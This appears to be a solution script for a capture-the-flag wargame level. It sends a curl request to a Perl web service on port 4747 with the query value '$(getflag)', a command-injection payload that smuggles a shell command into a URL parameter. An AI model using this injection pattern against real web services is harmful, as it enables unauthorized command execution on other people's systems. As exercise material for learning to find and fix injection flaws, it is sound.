#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level04@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level03/flag)

if [ $# -eq 1 ]; then
	echo "[+] Find perl file suppose to be executing on port 4747."
	echo "[+] Curl on localhost:4747, with x arg containing getflag command:"
	curl http://$1:4747?x='$(getflag)'
else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
